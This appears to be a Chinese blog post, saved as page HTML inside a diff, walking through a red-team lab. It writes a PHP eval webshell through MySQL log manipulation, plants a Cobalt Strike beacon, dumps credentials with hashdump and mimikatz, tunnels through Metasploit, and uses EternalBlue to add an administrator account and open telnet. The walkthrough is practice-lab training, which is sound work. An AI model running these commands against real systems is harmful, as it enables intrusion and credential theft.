@@ -1,0 +1,340 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>ATT&amp;CK红队评估(红日靶场一) | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01 靶场环境靶场搭建这一块就不再说了，errorr0师傅写的很详细，我的环境配置就是跟着他的文章搭建的 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_51295677&#x2F;article&#x2F;details&#x2F;124174404 网络拓扑  加上攻击机一共四台靶机 环境IP配置 kali (攻击机)：192.168.19.140 Windows 7 (web服务器，两网卡)：192.168.19.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ATT&amp;CK红队评估(红日靶场一)">
+<meta property="og:url" content="https://xilitter.github.io/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="0x01 靶场环境靶场搭建这一块就不再说了，errorr0师傅写的很详细，我的环境配置就是跟着他的文章搭建的 https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_51295677&#x2F;article&#x2F;details&#x2F;124174404 网络拓扑  加上攻击机一共四台靶机 环境IP配置 kali (攻击机)：192.168.19.140 Windows 7 (web服务器，两网卡)：192.168.19.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art/a7.jpg">
+<meta property="article:published_time" content="2023-10-05T08:19:10.000Z">
+<meta property="article:modified_time" content="2023-10-07T09:27:27.950Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="红日靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art/a7.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ATT&CK红队评估(红日靶场一)',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-07 17:27:27'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">32</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friend/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art/a7.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/friend/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ATT&amp;CK红队评估(红日靶场一)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-05T08:19:10.000Z" title="发表于 2023-10-05 16:19:10">2023-10-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-07T09:27:27.950Z" title="更新于 2023-10-07 17:27:27">2023-10-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ATT&amp;CK红队评估(红日靶场一)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="0x01-靶场环境"><a href="#0x01-靶场环境" class="headerlink" title="0x01 靶场环境"></a>0x01 靶场环境</h2><p>靶场搭建这一块就不再说了，<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677">errorr0</a>师傅写的很详细，我的环境配置就是跟着他的文章搭建的</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/124174404">https://blog.csdn.net/qq_51295677/article/details/124174404</a></p>
+<h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/1.png" class>
+
+<p>加上攻击机一共四台靶机</p>
+<h3 id="环境IP配置"><a href="#环境IP配置" class="headerlink" title="环境IP配置"></a>环境IP配置</h3><blockquote>
+<p>kali (攻击机)：192.168.19.140</p>
+<p>Windows 7 (web服务器，两网卡)：192.168.19.144（外网和kali连通）、192.168.5.128（内网）</p>
+<p>Windows 2008 (域控)：192.168.5.130</p>
+<p>Win2k3 (域管)：192.168.5.129</p>
+</blockquote>
+<h2 id="0x02-外网渗透"><a href="#0x02-外网渗透" class="headerlink" title="0x02 外网渗透"></a>0x02 外网渗透</h2><h3 id="外网信息收集"><a href="#外网信息收集" class="headerlink" title="外网信息收集"></a>外网信息收集</h3><p>win7作为一台服务器暴露在外网，与kali机存在同一网段</p>
+<p>用nmap扫描网段，找到外网服务器的真实IP</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/2.png" class>
+
+<p>外网IP为144结尾，那么再用nmap详细扫描一下开放的端口以及服务</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/3.png" class>
+
+<p>开的端口挺多，主要就是web服务，从扫描信息来看，得知服务器是一个Win32的机器</p>
+<p>访问服务器IP的80端口</p>
+<p>主页就是一个phpStudy的探针</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/4.png" class>
+
+<p>底部可以连接数据库，可以试一下账号密码，mysql默认的话，账号密码都是root</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/5.png" class>
+
+<p>账号密码正确，那么想远程连接一下mysql，理论上是可行的</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/6.png" class>
+
+<p>但是对外来IP做了限制，连接失败，回头继续从web入手</p>
+<p>页面没啥东西了，扫一下目录</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/7.png" class>
+
+<p>有phpmyadmin，这下又有突破口了，需要登录，账号密码为root，root直接可以登录进去</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/8.png" class>
+
+<h3 id="phpMyadmin写shell"><a href="#phpMyadmin写shell" class="headerlink" title="phpMyadmin写shell"></a>phpMyadmin写shell</h3><p>能写入shell拿权限才是最舒服的</p>
+<p>通过mysql写文件，一种是利用outfile，不过在mysql5.0以上就需要用户有写权限，和mysql配置中开启了相应的选项才能写入文件</p>
+<p>第二种就是修改日志文件的方式，在phpMyadmin中可以执行sql语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;</span><br><span class="line">查询系统变量的信息，在这里查新有关general的系统变量</span><br></pre></td></tr></table></figure>
+
+<p>查看日志保存状态</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/9.png" class>
+
+<p>本来是关闭日志保存的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line">设置全局变量</span><br></pre></td></tr></table></figure>
+
+<p>执行这个sql语句可以修改general_log的值，接下来修改日志保存的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET global general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>绝对路径可以在主页面的探针信息中找到</p>
+<p>查看日志保存状态，全局变量是否修改成功</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/10.png" class>
+
+<p>执行sql语句，将一句话木马保存在日志中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php @eval($_REQUEST[&quot;shell&quot;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/11.png" class>
+
+<p>成功拿到shell，拿下web服务器，剩下的就向内网渗透了</p>
+<h2 id="0x03-内网渗透"><a href="#0x03-内网渗透" class="headerlink" title="0x03 内网渗透"></a>0x03 内网渗透</h2><h3 id="Cobalt-Strike远控"><a href="#Cobalt-Strike远控" class="headerlink" title="Cobalt Strike远控"></a>Cobalt Strike远控</h3><p>连接蚁剑，这是Windows的操作系统，通常是没有nc或者bash的，所以要实现远控，就要利用Cobalt Strike来生成exe的马，kali机作为服务端，主机Win11作为客户端启动Cobalt Strike</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/12.png" class>
+
+<p>创建监听器用于木马回连，注意host为Cobalt Strike服务端，也就是kali机的ip，填了HTTP端口（上线）就不用再填写监听的端口了</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/17.png" class>
+
+<p>用CS生成Windows的后门程序，要使用64位的payload</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/13.png" class>
+
+<p>将生成的exe的后门程序通过蚁剑上传到服务器</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/14.png" class>
+
+<p>在服务器上运行exe可执行程序</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/15.png" class>
+
+<p>可以看到成功上线CS，右键开启一个会话交互</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/16.png" class>
+
+<p>通常来说，CS服务器默认60s会重连一次，所以指令会有延迟，执行sleep 0 加快回显，输入命令看看</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/18.png" class>
+
+<p><code>NT AUTHORITY\SYSTEM</code> 是 Windows 操作系统中的一个高度特权的帐户，通常也被称为 “System” 帐户，它具有对操作系统和系统资源的广泛访问权限，包括文件系统、注册表、系统服务、安全子系统等。所以不需要来提权了</p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>查看主机的网络配置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/19.png" class>
+
+<p>发现5网段的内网地址</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net view /domain</span><br><span class="line">列出指定域中的共享资源和计算机。</span><br><span class="line">已知域为GOD</span><br><span class="line">执行net view /domain:GOD 可以列出该域中所有共享的计算机</span><br></pre></td></tr></table></figure>
+
+<p>发现存在域</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/20.png" class>
+
+<p>抓取明文密码，在Cobalt Strike 中有个凭证提权的模块，里面有抓取明文密码的功能，使用 hashdump 和 logonpasswords 读内存和注册表密码，并且可以在密码凭证下查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashdump 获取密码哈希值，便于后续利用破解工具破解哈希得到密码</span><br><span class="line">logonpasswords 是mimikatz的一个命令，用于抓取密码</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/21.png" class>
+
+<h4 id="返回会话到msf"><a href="#返回会话到msf" class="headerlink" title="返回会话到msf"></a>返回会话到msf</h4><p>将会话返回到kali机上，与msf联动</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">#创建一个处理多个攻击负载的处理程序，用于接收受感染目标的连接。</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">#在这种情况下，所选的攻击负载是 Meterpreter 的反向 HTTP Shell。Meterpreter 是 Metasploit Framework 中的一个功能强大的后门工具，反向 HTTP Shell 攻击负载使用 HTTP 协议来与目标计算机通信</span><br><span class="line">set lhost 本机ip</span><br><span class="line">#设置主机ip</span><br><span class="line">set lport 接受的端口</span><br><span class="line">#设置监听的端口</span><br><span class="line">exploit 执行</span><br></pre></td></tr></table></figure>
+
+<p>设置自己在kali中监听的主机ip和端口，然后在cs中新建一个foreign监听的listeners</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/22.png" class>
+
+<p>对于上线的主机，选择这个foreign监听的listeners，新建一个会话，然后成功将这个会话返回给msf</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/23.png" class>
+
+<h4 id="建立socket代理"><a href="#建立socket代理" class="headerlink" title="建立socket代理"></a>建立socket代理</h4><p>在msf中执行 run post&#x2F;multi&#x2F;manage&#x2F;autoroute 新建路由</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run post/multi/manage/autoroute 是 Metasploit Framework 中的一个命令，用于执行一个名为 &quot;autoroute&quot; 的后渗透测试模块。这个模块的主要功能是配置路由，以便在受感染的目标网络上建立路由到其他子网或目标的通信路径。</span><br></pre></td></tr></table></figure>
+
+<p>执行 run autoroute -p 查看路由</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/24.png" class>
+
+<p>挂起会话，建立socks代理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">#将当前 Meterpreter 会话（如果存在）放入后台，以便可以执行其他操作</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">#该模块允许创建一个 SOCKS 代理服务器</span><br><span class="line">set VERSION 4a</span><br><span class="line">#设置 SOCKS 代理服务器的版本</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">#设置 SOCKS 代理服务器监听的主机 IP 地址。在这里，它设置为 127.0.0.1，表示只监听本地主机。</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>执行完exploit后，挂起一个job 列出所有当前运行的后台任务</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/25.png" class>
+
+<p>修改 proxychains4.conf 配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4.conf 是 ProxyChains 的配置文件，用于配置 ProxyChains 工具的行为。</span><br><span class="line">ProxyChains 是一个用于通过代理服务器进行网络通信的工具，它可以让您在绕过防火墙、匿名化网络通信或访问受限资源时，通过代理服务器传输数据。</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/26.png" class>
+
+<p>使用arp 探测内网存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set RHOSTS 192.168.5.0/24</span><br><span class="line">#设置扫描的内网网段</span><br><span class="line">set SESSION 1</span><br><span class="line">#设置要在哪个 Meterpreter 会话中执行 ARP 扫描</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/27.png" class>
+
+<p>除web服务器外，有两台内网主机。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.5.129/24</span><br><span class="line">192.168.5.130/24</span><br></pre></td></tr></table></figure>
+
+<h3 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h3><p>对其他内网主机进行端口探测</p>
+<p>Cobalt Strike中可以对域管进行端口扫描，搭建代理使用nmap扫描扫不全端口，不知道为什么，坑了我好久</p>
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/28.png" class>
+
+<p>扫描到445端口，可以打一波永恒之蓝（要是在实战中，估计就与目标无缘了）打64位系统</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line">set COMMAND net user</span><br><span class="line">#设置命令 这里的命令是net user  用于查看和管理用户帐户</span><br><span class="line">set RHOST 192.168.5.129</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/29.png" class>
+
+<p>攻击成功，拿到shell，试着对域管主机添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND net user hack xilitter@123 /add</span><br></pre></td></tr></table></figure>
+
+<p>然后把添加的用户加入管理员组</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND net localgroup administrators hack /add</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/30.png" class>
+
+<p>开启23端口，telnet服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set COMMAND sc config tlntsvr start= auto</span><br><span class="line">#使 Telnet 服务在系统启动时自动启动</span><br><span class="line">set COMMAND net start telnet</span><br><span class="line">#启动 Telnet 服务。一旦服务启动，系统将允许远程 Telnet 连接</span><br><span class="line">set COMMAND netstat -an</span><br><span class="line">#列出所有当前网络连接和端口状态</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/05/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/31.png" class>
+
+<p>成功开启，利用我们刚添加的用户信息远程登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains telnet 192.168.5.129</span><br></pre></td></tr></table></figure>
+
+<p>注意要用代理对我们的流量进行转发</p>
